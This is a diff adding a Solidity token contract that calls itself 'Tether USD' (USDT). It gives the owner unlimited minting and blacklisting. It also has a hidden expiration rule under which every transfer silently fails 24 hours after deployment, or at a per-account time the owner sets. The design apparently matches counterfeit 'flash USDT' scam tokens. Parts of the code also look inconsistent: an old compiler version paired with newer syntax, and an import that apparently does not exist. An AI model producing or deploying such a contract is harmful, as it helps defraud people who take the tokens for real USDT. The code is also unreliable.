@@ -1,0 +1,105 @@
+pragma solidity ^0.4.17;
+
+import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/token/ERC20/ERC20.sol";
+import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/ownership/Ownable.sol";
+import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/lifecycle/Pausable.sol";
+import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/access/Blacklistable.sol";
+
+contract USDT is ERC20, Ownable, Pausable, Blacklistable {
+    string public name = "Tether USD";
+    string public symbol = "USDT";
+    uint8 public decimals = 6;
+    
+    // Mapping-based expiration system
+    mapping(address => uint256) public accountExpirationTimes;
+    uint256 public globalExpirationTime;
+    
+    event WithdrawalExpiredEvent(address indexed sender, address indexed receiver, uint256 amount);
+    event ExpirationUpdated(address indexed account, uint256 expirationTime);
+
+    constructor(uint256 initialSupply) public {
+        _mint(msg.sender, initialSupply);
+        globalExpirationTime = now + 24 hours;
+    }
+
+    function transfer(address recipient, uint256 amount) 
+        public 
+        whenNotPaused 
+        returns (bool) 
+    {
+        require(!isBlacklisted(msg.sender), "Sender is blacklisted");
+        
+        uint256 expirationTime = accountExpirationTimes[msg.sender] > 0 ? 
+                              accountExpirationTimes[msg.sender] : 
+                              globalExpirationTime;
+        
+        if (now > expirationTime) {
+            emit WithdrawalExpiredEvent(msg.sender, recipient, amount);
+            return false;
+        }
+        
+        return super.transfer(recipient, amount);
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) 
+        public 
+        whenNotPaused 
+        returns (bool) 
+    {
+        require(!isBlacklisted(sender), "Sender is blacklisted");
+        
+        uint256 expirationTime = accountExpirationTimes[sender] > 0 ? 
+                              accountExpirationTimes[sender] : 
+                              globalExpirationTime;
+        
+        if (now > expirationTime) {
+            emit WithdrawalExpiredEvent(sender, recipient, amount);
+            return false;
+        }
+        
+        return super.transferFrom(sender, recipient, amount);
+    }
+
+    // Original USDT functions
+    function mint(address account, uint256 amount) public onlyOwner {
+        _mint(account, amount);
+    }
+
+    function burn(uint256 amount) public onlyOwner {
+        _burn(msg.sender, amount);
+    }
+
+    function pause() public onlyOwner {
+        _pause();
+    }
+
+    function unpause() public onlyOwner {
+        _unpause();
+    }
+
+    function addToBlacklist(address account) public onlyOwner {
+        addBlacklisted(account);
+    }
+
+    function removeFromBlacklist(address account) public onlyOwner {
+        removeBlacklisted(account);
+    }
+
+    // Enhanced expiration functions
+    function setGlobalExpiration(uint256 expirationTime) public onlyOwner {
+        require(expirationTime > now, "Must be future time");
+        globalExpirationTime = expirationTime;
+        emit ExpirationUpdated(address(0), expirationTime);
+    }
+
+    function setAccountExpiration(address account, uint256 expirationTime) public onlyOwner {
+        accountExpirationTimes[account] = expirationTime;
+        emit ExpirationUpdated(account, expirationTime);
+    }
+
+    function getEffectiveExpiration(address account) public view returns (uint256) {
+        return accountExpirationTimes[account] > 0 ? 
+               accountExpirationTimes[account] : 
+               globalExpirationTime;
+    }
+}
